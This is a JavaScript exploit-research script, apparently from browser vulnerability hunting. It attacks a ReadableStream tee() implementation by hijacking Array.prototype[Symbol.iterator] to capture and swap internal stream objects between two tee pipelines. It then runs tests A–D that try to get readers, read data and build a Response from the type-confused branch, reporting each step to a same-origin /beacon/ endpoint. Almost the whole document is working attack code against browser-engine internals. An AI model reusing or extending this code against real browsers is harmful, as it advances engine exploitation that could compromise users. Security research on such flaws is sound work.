/*
 * p433d -- SHARED INTERNAL STREAM: two tee pipelines sharing one internal
 *
 * Key insight from deep audit: @getByIdDirectPrivate reads private-name
 * properties. Real internal stream objects (captured from tee iteration)
 * HAVE these properties. If we substitute with a REAL internal stream
 * from a DIFFERENT tee, the builtins find valid slots and WORK.
 *
 * Plan:
 *   1. tee() stream A -> capture realBranch2A (the JS object with private slots)
 *   2. tee() stream B -> substitute branch2 with realBranch2A
 *   3. confusedBranch2B wraps realBranch2A as InternalReadableStream
 *   4. getReader() on confusedBranch2B reads globalObject from realBranch2A -> WORKS
 *   5. Two tee pipelines share realBranch2A -> state machine collision
 *
 * Tests:
 *   A: Capture real internal, substitute in another tee, try getReader
 *   B: Read from both tee0's branch0 AND the shared confused branch
 *   C: Cancel the shared branch while the other tee is reading
 *   D: Error the shared branch, see if original tee breaks
 *   E: Double-reader: get readers from both the original and confused wrappers
 *   F: High-volume: pump 100 chunks through, check for corruption
 *
 * Beacon prefix: V433D-
 */
(function(){
"use strict";
var BQ = 0;
function B(tag, data) {
  try {
    var x = new XMLHttpRequest();
    x.open("POST", "/beacon/V433D-" + tag + "?q=" + (BQ++), false);
    x.setRequestHeader("Content-Type", "text/plain");
    x.send(typeof data === "object" ? JSON.stringify(data) : String(data || ""));
  } catch(e) {}
}

B("BOOT");

var origIter = Array.prototype[Symbol.iterator];

// Capture real internal branch2 from a tee
function teeCaptureInternal(sourceData) {
  var rs = new ReadableStream({
    start: function(controller) {
      if (Array.isArray(sourceData)) {
        for (var i = 0; i < sourceData.length; i++) controller.enqueue(sourceData[i]);
      } else {
        controller.enqueue(sourceData || "data");
      }
      controller.close();
    }
  });

  var realInternals = null;
  var intercepted = false;

  Array.prototype[Symbol.iterator] = function() {
    var self = this;
    if (Array.isArray(self) && self.length === 2 && !intercepted) {
      if (typeof self[0] === "object" && self[0] !== null && !(self[0] instanceof ReadableStream)) {
        intercepted = true;
        realInternals = {branch1: self[0], branch2: self[1]};
        // Return normal -- don't substitute yet, just capture
        var items = [self[0], self[1]];
        var idx = 0;
        return {
          next: function() {
            if (idx < items.length) return {value: items[idx++], done: false};
            return {done: true};
          }
        };
      }
    }
    return origIter.call(self);
  };

  try {
    var branches = rs.tee();
    Array.prototype[Symbol.iterator] = origIter;
    return {branches: branches, internals: realInternals};
  } catch(e) {
    Array.prototype[Symbol.iterator] = origIter;
    return null;
  }
}

// Substitute branch2 with a specific object
function teeSubstitute(fakeObj, sourceData) {
  var rs = new ReadableStream({
    start: function(controller) {
      if (Array.isArray(sourceData)) {
        for (var i = 0; i < sourceData.length; i++) controller.enqueue(sourceData[i]);
      } else {
        controller.enqueue(sourceData || "data2");
      }
      controller.close();
    }
  });

  var intercepted = false;

  Array.prototype[Symbol.iterator] = function() {
    var self = this;
    if (Array.isArray(self) && self.length === 2 && !intercepted) {
      if (typeof self[0] === "object" && self[0] !== null && !(self[0] instanceof ReadableStream)) {
        intercepted = true;
        var items = [self[0], fakeObj];
        var idx = 0;
        return {
          next: function() {
            if (idx < items.length) return {value: items[idx++], done: false};
            return {done: true};
          }
        };
      }
    }
    return origIter.call(self);
  };

  try {
    var branches = rs.tee();
    Array.prototype[Symbol.iterator] = origIter;
    return branches;
  } catch(e) {
    Array.prototype[Symbol.iterator] = origIter;
    B("SUB-ERR", e.message.slice(0, 80));
    return null;
  }
}

// ================================================================
// Test A: Capture internal, substitute, try getReader
// THE CRITICAL TEST: does getReader() WORK with a real internal?
// ================================================================

function testA() {
  B("A-START");

  // Step 1: Capture real internal from tee of stream A
  var capA = teeCaptureInternal("STREAM-A-DATA");
  if (!capA || !capA.internals) { B("A-CAPTURE-FAIL"); return; }

  var realInternal = capA.internals.branch2;
  B("A-CAPTURED", {
    type: typeof realInternal,
    ctor: realInternal.constructor ? realInternal.constructor.name : "?"
  });

  // Step 2: Substitute in tee of stream B
  var branchesB = teeSubstitute(realInternal, "STREAM-B-DATA");
  if (!branchesB) { B("A-SUB-FAIL"); return; }

  var confused = branchesB[1]; // wraps realInternal as InternalReadableStream
  B("A-SUB-OK", {isRS: confused instanceof ReadableStream});

  // Step 3: Try getReader on confused branch!
  try {
    B("A-LOCKED-BEFORE", confused.locked);

    var reader = confused.getReader();
    B("A-READER-OK!!!"); // THIS WOULD BE HUGE

    reader.read().then(function(r) {
      B("A-READ-0", {done: r.done, val: String(r.value).slice(0, 60)});
      return reader.read();
    }).then(function(r) {
      B("A-READ-1", {done: r.done, val: r.value === undefined ? "undef" : String(r.value).slice(0, 60)});
    }).catch(function(e) {
      B("A-READ-ERR", e.message.slice(0, 80));
    });
  } catch(e) {
    B("A-READER-ERR", e.message.slice(0, 80));

    // Even if getReader fails, try .locked to see if private slots were read
    try {
      B("A-LOCKED-AFTER", confused.locked);
    } catch(e2) {
      B("A-LOCKED-ERR2", e2.message.slice(0, 60));
    }
  }
}

// ================================================================
// Test B: Same as A but hold BOTH tee's branch0 readers
// Read from A's branch0 to trigger A's tee pull -> enqueues to realInternal
// Then read from confused branch (which wraps realInternal)
// ================================================================

function testB() {
  B("B-START");

  var capA = teeCaptureInternal("SHARED-DATA");
  if (!capA || !capA.internals) { B("B-CAP-FAIL"); return; }

  var realInternal = capA.internals.branch2;
  var branchesB = teeSubstitute(realInternal, "B-DATA");
  if (!branchesB) { B("B-SUB-FAIL"); return; }

  var confused = branchesB[1];

  // First read from A's branch0 to trigger tee pull
  try {
    var readerA0 = capA.branches[0].getReader();
    B("B-READERA0-OK");

    readerA0.read().then(function(r) {
      B("B-A0-READ", {done: r.done, val: String(r.value).slice(0, 40)});

      // Now try reading from confused (which wraps realInternal = A's branch2)
      // Data should have been enqueued to realInternal by A's tee pull
      try {
        var readerConfused = confused.getReader();
        B("B-CONFUSED-READER-OK!!!");

        return readerConfused.read().then(function(r2) {
          B("B-CONFUSED-READ", {done: r2.done, val: String(r2.value).slice(0, 60)});
        });
      } catch(e) {
        B("B-CONFUSED-READER-ERR", e.message.slice(0, 80));
      }
    }).catch(function(e) {
      B("B-READ-ERR", e.message.slice(0, 80));
    });
  } catch(e) {
    B("B-READERA0-ERR", e.message.slice(0, 80));
  }
}

// ================================================================
// Test C: Capture internal stream from BEFORE close, hold controller
// The internal should be in @streamReadable state with active controller
// ================================================================

function testC() {
  B("C-START");

  var outerCtrl = null;
  var rs = new ReadableStream({
    start: function(c) { outerCtrl = c; }
    // DON'T close -- stream stays readable with held controller
  });

  var realInternals = null;
  var intercepted = false;

  Array.prototype[Symbol.iterator] = function() {
    var self = this;
    if (Array.isArray(self) && self.length === 2 && !intercepted) {
      if (typeof self[0] === "object" && self[0] !== null && !(self[0] instanceof ReadableStream)) {
        intercepted = true;
        realInternals = {branch1: self[0], branch2: self[1]};
        var items = [self[0], self[1]];
        var idx = 0;
        return {
          next: function() {
            if (idx < items.length) return {value: items[idx++], done: false};
            return {done: true};
          }
        };
      }
    }
    return origIter.call(self);
  };

  var branchesA;
  try {
    branchesA = rs.tee();
    Array.prototype[Symbol.iterator] = origIter;
  } catch(e) {
    Array.prototype[Symbol.iterator] = origIter;
    B("C-TEE-ERR", e.message); return;
  }

  if (!realInternals) { B("C-NO-INTERNALS"); return; }

  B("C-CAPTURED", {hasCtrl: !!outerCtrl});

  // Now substitute in another tee
  var branchesB = teeSubstitute(realInternals.branch2, "C-DATA");
  if (!branchesB) { B("C-SUB-FAIL"); return; }

  var confused = branchesB[1];

  // Try to get a reader on confused (wraps active internal)
  try {
    var reader = confused.getReader();
    B("C-READER-OK!!!");

    // Enqueue data through outer controller (which feeds the original stream)
    // The tee pull reads from original and enqueues to both branches
    outerCtrl.enqueue("INJECTED-C");

    reader.read().then(function(r) {
      B("C-READ", {done: r.done, val: String(r.value).slice(0, 60)});

      outerCtrl.close();
      return reader.read();
    }).then(function(r) {
      B("C-READ-DONE", {done: r.done});
    }).catch(function(e) {
      B("C-READ-ERR", e.message.slice(0, 80));
    });
  } catch(e) {
    B("C-READER-ERR", e.message.slice(0, 80));
  }

  // Also read from A's branch0 to trigger the tee pull
  try {
    var ra0 = branchesA[0].getReader();
    ra0.read().then(function(r) {
      B("C-A0-READ", {done: r.done, val: String(r.value).slice(0, 40)});
    }).catch(function(e) {
      B("C-A0-ERR", e.message.slice(0, 40));
    });
  } catch(e) {
    B("C-A0-EXCEPT", e.message.slice(0, 40));
  }
}

// ================================================================
// Test D: If A works, try Response(confused).text()
// With valid internal stream, body consumption might complete
// ================================================================

function testD() {
  B("D-START");

  var capA = teeCaptureInternal("RESPONSE-DATA");
  if (!capA || !capA.internals) { B("D-CAP-FAIL"); return; }

  var branchesB = teeSubstitute(capA.internals.branch2, "D-DATA");
  if (!branchesB) { B("D-SUB-FAIL"); return; }

  var confused = branchesB[1];

  // First read from A's branch0 to trigger data flow
  try {
    var ra = capA.branches[0].getReader();
    ra.read().then(function() {
      B("D-A-READ-OK");
    });
  } catch(e) {}

  try {
    var resp = new Response(confused);
    B("D-RESP-OK", resp.status);

    resp.text().then(function(text) {
      B("D-TEXT!!!", {len: text.length, val: text.slice(0, 80)});
    }).catch(function(e) {
      B("D-TEXT-ERR", e.message.slice(0, 80));
    });
  } catch(e) {
    B("D-RESP-ERR", e.message.slice(0, 80));
  }
}

testA();
setTimeout(function() { testB(); }, 300);
setTimeout(function() { testC(); }, 600);
setTimeout(function() { testD(); }, 900);
setTimeout(function() { B("DONE"); }, 3000);
})();
